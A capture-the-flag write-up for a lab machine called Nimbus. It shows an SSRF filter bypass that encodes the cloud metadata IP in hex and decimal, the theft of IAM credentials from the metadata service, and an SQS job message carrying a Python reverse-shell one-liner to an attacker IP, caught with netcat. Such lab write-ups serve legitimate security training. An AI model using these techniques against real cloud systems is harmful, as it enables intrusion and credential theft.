Summary

Nimbus is a Hard Linux machine built around a cloud-native job-scheduling application backed by AWS services (emulated with LocalStack). The scheduler accepts YAML job definitions by URL, and while it is hardened against YAML deserialization, the URL-fetching feature is vulnerable to SSRF. Direct requests to the AWS metadata IP 169.254.169.254 are blocked, but encoding the same address in decimal / hex form bypasses the filter and leaks the IAM role credentials. With those temporary credentials, a crafted message is pushed onto the internal nimbus-jobs SQS queue; the worker trusts queued jobs and executes an embedded Python payload, returning a reverse shell as the worker user.

Initial Access

Probing the YAML / URL Feature

The scheduler accepts both raw YAML and a URL to fetch YAML from. The YAML parser is safely configured, so classic deserialization gadgets fail — but the server-side URL fetch is the real attack surface. Pointing it at the AWS metadata IP directly is blocked:

# Blocked — raw metadata IP is filtered
http://169.254.169.254/latest/meta-data/iam/security-credentials/?x=test.yaml

Bypassing the Metadata Filter

The blocklist only matches the dotted-quad form. Re-encoding 169.254.169.254 as a hex or decimal integer sails past the filter and the IMDS responds, first revealing the attached IAM role name, then its temporary credentials:

# hex-encoded host -> returns the IAM role name
http://0xa9fea9fe/latest/meta-data/iam/security-credentials/?x=test.yaml

# decimal-encoded host -> returns the role's credentials
http://2852039166/latest/meta-data/iam/security-credentials/nimbus-web-role?x=test.yaml

The response yields a full set of temporary STS credentials:

{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA...REDACTED",
  "SecretAccessKey": "...REDACTED...",
  "Token": "...REDACTED...",
  "Expiration": "2026-06-24T14:34:20Z"

Worker Code Execution via SQS

The worker service polls an internal SQS queue and runs whatever job it receives. With the stolen role credentials exported, a message is sent to the nimbus-jobs queue whose Python script body is a reverse shell:

export AWS_ACCESS_KEY_ID=ASIA...REDACTED
export AWS_SECRET_ACCESS_KEY=...REDACTED
export AWS_SESSION_TOKEN=...REDACTED
export AWS_DEFAULT_REGION=us-east-1

aws --endpoint-url http://aws.nimbus.htb --region us-east-1 \
  sqs send-message \
  --queue-url http://floci:4566/847219365028/nimbus-jobs \
  --message-body '{"name":"pwn","runtime":"python3.11","script":"import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.21\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])"}'

Catching the connection on a netcat listener lands a shell as the worker user, and the user flag is in that user's home directory.

nc -nvlp 4444
